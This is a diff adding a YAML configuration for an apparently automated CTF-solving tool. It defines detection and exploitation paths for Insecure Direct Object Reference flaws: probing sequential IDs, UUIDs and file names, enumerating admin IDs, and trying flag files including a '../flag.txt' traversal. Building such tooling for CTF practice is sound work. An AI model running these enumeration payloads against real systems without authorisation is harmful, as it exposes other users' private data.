@@ -1,0 +1,170 @@
+# ============================================================
+# Tree metadata
+# ============================================================
+id: web_idor
+name: Insecure Direct Object Reference
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects and exploits IDOR vulnerabilities where direct object references
+  (IDs, filenames, keys) are exposed without proper authorization checks.
+  Targets sequential IDs, UUIDs, and file paths to access unauthorized data.
+
+# ============================================================
+# Guard
+# ============================================================
+applies_when:
+  - "context.challenge.type == 'web'"
+
+min_confidence: 0.10
+
+stop_on_flag: true
+
+# ============================================================
+# Confidence seeds
+# ============================================================
+confidence_seeds:
+  - if: "any(p in context.params for p in ['id','user_id','uid','order_id','doc_id','file_id','key','invoice','account'])"
+    boost: 0.40
+    label: "Direct object reference parameter found"
+  - if: "any(p in context.found_paths for p in ['/user', '/profile', '/document', '/file', '/order', '/account', '/invoice'])"
+    boost: 0.25
+    label: "Object reference endpoint found"
+  - if: "any(p in context.params for p in ['file','document','doc','attachment','download'])"
+    boost: 0.20
+    label: "File reference parameter found"
+
+# ============================================================
+# Detection paths
+# ============================================================
+detection_paths:
+
+  - id: sequential_id_probe
+    name: Sequential ID enumeration
+    description: >
+      Test if sequential numeric IDs allow access to other users' data.
+    min_confidence: 0.15
+    steps:
+      - id: id_increment_test
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - '1'
+            - '2'
+            - '100'
+            - '1000'
+        signals:
+          - match: 'user|profile|document|data'
+            on_match:
+              confidence_boost: 0.35
+              emit: idor_sequential_confirmed
+
+  - id: uuid_enumeration
+    name: UUID/GUID enumeration
+    description: >
+      Test if UUIDs or GUIDs can be enumerated or predicted.
+    min_confidence: 0.20
+    steps:
+      - id: uuid_test
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - '00000000-0000-0000-0000-000000000001'
+            - 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa'
+        signals:
+          - match: 'user|found|data'
+            on_match:
+              confidence_boost: 0.30
+              emit: idor_uuid_confirmed
+
+  - id: file_path_idor
+    name: File path direct reference
+    description: >
+      Test if file paths can be manipulated to access other files.
+    min_confidence: 0.15
+    steps:
+      - id: file_path_test
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - 'file1.txt'
+            - 'document1.pdf'
+            - 'user1_data.txt'
+            - 'flag.txt'
+        signals:
+          - match: 'download|file|document|content'
+            on_match:
+              confidence_boost: 0.35
+              emit: idor_file_confirmed
+
+# ============================================================
+# Exploitation paths
+# ============================================================
+exploitation_paths:
+
+  - id: idor_flag_access
+    name: Direct flag file access
+    requires_signal: idor_file_confirmed
+    technique: idor_file_enumeration
+    steps:
+      - id: enumerate_flag_files
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - 'flag.txt'
+            - 'flag'
+            - 'admin_flag.txt'
+            - 'secret.txt'
+            - '../flag.txt'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
+
+  - id: idor_admin_access
+    name: Admin account enumeration
+    requires_signal: idor_sequential_confirmed
+    technique: idor_id_enumeration
+    steps:
+      - id: enum_admin_ids
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - '0'
+            - '1'
+            - '999'
+            - 'admin'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'admin|administrator'
+            as: admin_found
+
+  - id: idor_mass_enumeration
+    name: Mass object enumeration
+    requires_signal: idor_sequential_confirmed
+    technique: idor_brute_force_enum
+    steps:
+      - id: enumerate_range
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - '1'
+            - '2'
+            - '3'
+            - '4'
+            - '5'
+            - '10'
+            - '50'
+            - '100'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
